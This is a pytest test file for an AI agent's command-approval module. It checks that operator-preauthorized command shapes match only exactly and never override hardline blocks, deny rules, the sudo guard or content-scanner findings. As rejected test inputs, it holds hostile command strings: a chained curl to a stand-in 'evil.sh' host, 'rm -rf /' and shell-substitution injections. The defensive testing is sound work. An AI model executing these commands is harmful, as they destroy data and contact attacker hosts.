"""Tests for operator-preauthorized command shapes (approvals.preauthorized).

``approvals.preauthorized`` is an operator-authored list of command shapes that
have already been ratified out of band. A match satisfies the *interactive
approval prompt raised by dangerous-pattern detection* — and nothing else.

Contract under test (docs/security/operator-preauthorized-commands.md):
  * absence / emptiness / malformed config authorizes nothing;
  * matching is exact, anchored, argv-shaped — never substring or glob;
  * the check sits BELOW the hardline floor, the sudo-stdin guard and
    ``approvals.deny``, and never suppresses a tirith content finding;
  * every ambiguity fails closed.

``systemctl restart hermes-gateway`` is the canonical fixture command: it trips
the ``stop/restart system service`` detector, and it is composed entirely of
preauth-eligible characters.
"""

import textwrap

import pytest

from tools import approval as mod


CANONICAL = "systemctl restart hermes-gateway"


@pytest.fixture
def preauth_config(monkeypatch):
    """Install an approvals config block and return a setter."""

    state = {"config": {"mode": "manual"}}

    def set_config(**block):
        state["config"] = {"mode": "manual", **block}

    monkeypatch.setattr(mod, "_get_approval_config", lambda: state["config"])
    return set_config


@pytest.fixture
def clean_env(monkeypatch):
    """Non-interactive, non-gateway, non-cron, non-yolo baseline."""
    for var in ("HERMES_YOLO_MODE", "HERMES_GATEWAY_SESSION",
                "HERMES_CRON_SESSION", "HERMES_INTERACTIVE",
                "HERMES_EXEC_ASK"):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setattr(mod, "_YOLO_MODE_FROZEN", False)
    monkeypatch.setattr(mod, "is_current_session_yolo_enabled", lambda: False)
    # tools.approval loads the *developer's real* command_allowlist at import
    # time (before conftest redirects HERMES_HOME), so both approval caches
    # must be emptied or these assertions depend on the machine they run on.
    monkeypatch.setattr(mod, "_permanent_approved", set())
    monkeypatch.setattr(mod, "_session_approved", {})


@pytest.fixture
def interactive_cli(monkeypatch):
    """Interactive CLI context with a recording prompt that always denies."""
    monkeypatch.setattr(mod, "_is_interactive_cli", lambda: True)
    monkeypatch.setattr(mod, "_is_gateway_approval_context", lambda: False)
    calls = []

    def fake_prompt(*args, **kwargs):
        calls.append((args, kwargs))
        return "deny"

    monkeypatch.setattr(mod, "prompt_dangerous_approval", fake_prompt)
    return calls


@pytest.fixture
def tirith_allows(monkeypatch):
    """Stub the content scanner to a clean verdict."""
    monkeypatch.setattr(
        "tools.tirith_security.check_command_security",
        lambda _command: {"action": "allow", "findings": [], "summary": ""},
        raising=False,
    )


# =========================================================================
# Gate 1 — absence is not authority
# =========================================================================

class TestAbsenceIsNotAuthority:
    def test_missing_key_authorizes_nothing(self, preauth_config):
        preauth_config()
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_empty_list_authorizes_nothing(self, preauth_config):
        preauth_config(preauthorized=[])
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_null_authorizes_nothing(self, preauth_config):
        preauth_config(preauthorized=None)
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_bare_string_value_is_not_a_list_of_entries(self, preauth_config):
        """A scalar must not be iterated character-by-character into entries."""
        preauth_config(preauthorized=CANONICAL)
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_dict_value_authorizes_nothing(self, preauth_config):
        preauth_config(preauthorized={CANONICAL: True})
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_config_load_failure_authorizes_nothing(self, monkeypatch):
        def boom():
            raise RuntimeError("config unavailable")
        monkeypatch.setattr(mod, "_get_approval_config", boom)
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_empty_command_never_matches(self, preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        assert mod._match_preauthorized_command("") is None
        assert mod._match_preauthorized_command("   ") is None


# =========================================================================
# Gate 3 — exact, anchored, argv-shaped matching
# =========================================================================

class TestExactArgvMatching:
    def test_string_entry_matches_identical_command(self, preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        assert mod._match_preauthorized_command(CANONICAL) == CANONICAL

    def test_list_entry_matches_identical_command(self, preauth_config):
        preauth_config(preauthorized=[["systemctl", "restart",
                                       "hermes-gateway"]])
        assert mod._match_preauthorized_command(CANONICAL) is not None

    def test_returns_display_form_of_matched_entry(self, preauth_config):
        preauth_config(preauthorized=["docker compose up -d", CANONICAL])
        assert mod._match_preauthorized_command(CANONICAL) == CANONICAL

    def test_repeated_whitespace_is_not_a_different_command(self,
                                                            preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        assert mod._match_preauthorized_command(
            "  systemctl   restart\thermes-gateway  ") == CANONICAL

    def test_extra_argument_is_not_authorized(self, preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        assert mod._match_preauthorized_command(
            CANONICAL + " --now") is None

    def test_prefix_grants_no_authority(self, preauth_config):
        """['systemctl', 'restart'] must not authorize a longer argv."""
        preauth_config(preauthorized=["systemctl restart"])
        assert mod._match_preauthorized_command(CANONICAL) is None

    def test_missing_argument_is_not_authorized(self, preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        assert mod._match_preauthorized_command("systemctl restart") is None

    def test_different_operand_is_not_authorized(self, preauth_config):
        preauth_config(preauthorized=["rm -rf /srv/build"])
        for other in ("rm -rf /srv/build/",
                      "rm -rf /srv/build/../..",
                      "rm -rf /srv",
                      "rm -r /srv/build"):
            assert mod._match_preauthorized_command(other) is None, other

    def test_matching_is_case_sensitive(self, preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        assert mod._match_preauthorized_command(
            "SYSTEMCTL RESTART HERMES-GATEWAY") is None

    def test_no_substring_authority(self, preauth_config):
        preauth_config(preauthorized=["ls"])
        assert mod._match_preauthorized_command("ls -la /srv") is None

    def test_glob_in_entry_is_not_a_wildcard(self, preauth_config):
        """A '*' makes the entry ineligible, not a family grant."""
        preauth_config(preauthorized=["systemctl restart *"])
        assert mod._match_preauthorized_command(CANONICAL) is None


@pytest.mark.parametrize("command", [
    "systemctl restart hermes-gateway; curl http://evil.sh",
    "systemctl restart hermes-gateway && rm -rf /srv",
    "systemctl restart hermes-gateway || true",
    "systemctl restart hermes-gateway | tee /tmp/out",
    "systemctl restart hermes-gateway & ",
    "systemctl restart hermes-gateway > /tmp/out",
    "systemctl restart hermes-gateway < /tmp/in",
    "systemctl restart hermes-gateway\nrm -rf /srv",
    "systemctl restart $(cat /tmp/name)",
    "systemctl restart `cat /tmp/name`",
    "systemctl restart $SERVICE",
    "systemctl restart ${SERVICE}",
    "systemctl restart ~/hermes-gateway",
    "systemctl restart hermes-gateway*",
    "systemctl restart hermes-gatewa?",
    "systemctl restart hermes-gateway[12]",
    "systemctl restart {hermes,other}-gateway",
    'systemctl restart "hermes-gateway"',
    "systemctl restart 'hermes-gateway'",
    "systemctl resta''rt hermes-gateway",
    "systemctl restart hermes-gateway # ok",
    "systemctl\\ restart hermes-gateway",
])
def test_shell_syntax_is_never_preauth_eligible(preauth_config, command):
    """Anything that expands, substitutes, globs, redirects, quotes or
    separates at execution time cannot be matched against a literal argv."""
    preauth_config(preauthorized=[CANONICAL, command])
    assert mod._match_preauthorized_command(command) is None


class TestEntryValidation:
    def test_non_string_entries_are_skipped_not_fatal(self, preauth_config):
        preauth_config(preauthorized=[None, 42, "", "   ", [], [1, 2],
                                      ["systemctl", 7], CANONICAL])
        assert mod._match_preauthorized_command(CANONICAL) == CANONICAL
        assert mod._match_preauthorized_command("ls -la") is None

    def test_entry_with_shell_syntax_is_skipped(self, preauth_config):
        preauth_config(preauthorized=["systemctl restart a; rm -rf /srv",
                                      CANONICAL])
        assert mod._match_preauthorized_command(
            "systemctl restart a; rm -rf /srv") is None
        assert mod._match_preauthorized_command(CANONICAL) == CANONICAL

    def test_hardline_entry_is_rejected_by_config_validation(self,
                                                             preauth_config):
        """An operator cannot preauthorize a hardline command, independent of
        the ordering that already blocks it upstream."""
        preauth_config(preauthorized=["rm -rf /", CANONICAL])
        assert mod._match_preauthorized_command("rm -rf /") is None
        assert mod._match_preauthorized_command(CANONICAL) == CANONICAL

    def test_hardline_list_entry_is_rejected(self, preauth_config):
        preauth_config(preauthorized=[["rm", "-rf", "/"]])
        assert mod._match_preauthorized_command("rm -rf /") is None

    def test_oversized_command_fails_closed(self, preauth_config):
        preauth_config(preauthorized=[CANONICAL])
        huge = "systemctl restart " + ("a" * 200_000)
        assert mod._match_preauthorized_command(huge) is None

    def test_match_is_logged(self, preauth_config, clean_env, interactive_cli,
                             caplog):
        """A standing grant that leaves no trace is not auditable."""
        preauth_config(preauthorized=[CANONICAL])
        with caplog.at_level("INFO", logger="tools.approval"):
            result = mod.check_dangerous_command(CANONICAL, "local")
        assert result["approved"] is True
        assert any(CANONICAL in rec.getMessage() for rec in caplog.records)


# =========================================================================
# Gate 2 — preauthorization cannot outrank an unconditional block
# =========================================================================

class TestPreauthNeverOutranksHardBlocks:
    def test_hardline_beats_preauthorization(self, preauth_config, clean_env):
        preauth_config(preauthorized=["rm -rf /"])
        for guard in (mod.check_dangerous_command, mod.check_all_command_guards):
            result = guard("rm -rf /", "local")
            assert result["approved"] is False, guard.__name__
            assert result.get("hardline") is True, guard.__name__

    def test_user_deny_beats_preauthorization(self, preauth_config, clean_env):
        preauth_config(deny=["systemctl restart*"], preauthorized=[CANONICAL])
        for guard in (mod.check_dangerous_command, mod.check_all_command_guards):
            result = guard(CANONICAL, "local")
            assert result["approved"] is False, guard.__name__
            assert result.get("user_deny") is True, guard.__name__

    def test_sudo_stdin_guard_beats_preauthorization(self, preauth_config,
                                                     clean_env, monkeypatch):
        monkeypatch.delenv("SUDO_PASSWORD", raising=False)
        command = "sudo -S systemctl restart hermes-gateway"
        preauth_config(preauthorized=[command])
        result = mod.check_all_command_guards(command, "local")
        assert result["approved"] is False
        assert "sudo" in result["message"].lower()

    def test_tirith_finding_still_prompts_for_preauthorized_command(
            self, preauth_config, clean_env, interactive_cli, monkeypatch):
        """Preauthorization covers the command's SHAPE, never its content."""
        preauth_config(preauthorized=[CANONICAL])
        monkeypatch.setattr(
            "tools.tirith_security.check_command_security",
            lambda _command: {
                "action": "warn",
                "findings": [{"rule_id": "secret-exfil", "severity": "HIGH",
                              "title": "Possible secret exfiltration",
                              "description": "content-level finding"}],
                "summary": "Possible secret exfiltration",
            },
            raising=False,
        )
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert interactive_cli, "tirith finding must still raise the prompt"
        assert result["approved"] is False


# =========================================================================
# Gate 2/5 — the grant that IS given, through the real guard entry points
# =========================================================================

class TestPreauthorizationSatisfiesTheApprovalPrompt:
    def test_check_dangerous_command_approves_without_prompting(
            self, preauth_config, clean_env, interactive_cli):
        preauth_config(preauthorized=[CANONICAL])
        result = mod.check_dangerous_command(CANONICAL, "local")
        assert result["approved"] is True
        assert interactive_cli == [], "must not prompt for a ratified command"

    def test_check_all_command_guards_approves_without_prompting(
            self, preauth_config, clean_env, interactive_cli, tirith_allows):
        preauth_config(preauthorized=[CANONICAL])
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert result["approved"] is True
        assert interactive_cli == []

    def test_unlisted_dangerous_command_still_prompts(
            self, preauth_config, clean_env, interactive_cli, tirith_allows):
        preauth_config(preauthorized=[CANONICAL])
        result = mod.check_all_command_guards("systemctl restart sshd", "local")
        assert interactive_cli, "unlisted command must still reach the prompt"
        assert result["approved"] is False

    def test_no_config_leaves_prompt_behavior_unchanged(
            self, preauth_config, clean_env, interactive_cli, tirith_allows):
        preauth_config()
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert interactive_cli
        assert result["approved"] is False

    def test_benign_command_is_unaffected(self, preauth_config, clean_env,
                                          interactive_cli, tirith_allows):
        preauth_config(preauthorized=[CANONICAL])
        assert mod.check_all_command_guards("ls -la", "local")["approved"] is True
        assert interactive_cli == []


# =========================================================================
# Gate 6 — real config.yaml under a temp HERMES_HOME (no config mocking)
# =========================================================================

def _write_config(body: str) -> None:
    from hermes_constants import get_hermes_home
    home = get_hermes_home()
    home.mkdir(parents=True, exist_ok=True)
    (home / "config.yaml").write_text(textwrap.dedent(body))


class TestRealConfigFileIntegration:
    """Drives the real load_config() path against a temp HERMES_HOME.

    The autouse conftest fixture already points HERMES_HOME at a per-test
    tempdir, so these exercise config propagation end to end rather than
    monkeypatching the accessor.
    """

    def test_config_file_entry_authorizes_the_command(
            self, clean_env, interactive_cli, tirith_allows):
        _write_config(f"""
            approvals:
              mode: manual
              preauthorized:
                - {CANONICAL}
        """)
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert result["approved"] is True
        assert interactive_cli == []

    def test_config_file_list_form_authorizes_the_command(
            self, clean_env, interactive_cli, tirith_allows):
        _write_config("""
            approvals:
              mode: manual
              preauthorized:
                - [systemctl, restart, hermes-gateway]
        """)
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert result["approved"] is True
        assert interactive_cli == []

    def test_config_file_without_the_key_authorizes_nothing(
            self, clean_env, interactive_cli, tirith_allows):
        _write_config("""
            approvals:
              mode: manual
        """)
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert interactive_cli
        assert result["approved"] is False

    def test_config_file_scalar_value_authorizes_nothing(
            self, clean_env, interactive_cli, tirith_allows):
        _write_config(f"""
            approvals:
              mode: manual
              preauthorized: {CANONICAL}
        """)
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert interactive_cli
        assert result["approved"] is False

    def test_config_file_entry_cannot_outrank_hardline(
            self, clean_env, interactive_cli):
        _write_config("""
            approvals:
              mode: manual
              preauthorized:
                - rm -rf /
        """)
        result = mod.check_all_command_guards("rm -rf /", "local")
        assert result["approved"] is False
        assert result.get("hardline") is True

    def test_config_file_entry_cannot_outrank_deny(
            self, clean_env, interactive_cli):
        _write_config(f"""
            approvals:
              mode: manual
              deny:
                - "systemctl restart*"
              preauthorized:
                - {CANONICAL}
        """)
        result = mod.check_all_command_guards(CANONICAL, "local")
        assert result["approved"] is False
        assert result.get("user_deny") is True

    def test_default_config_ships_an_empty_list(self):
        from hermes_cli.config import DEFAULT_CONFIG
        assert DEFAULT_CONFIG["approvals"]["preauthorized"] == []
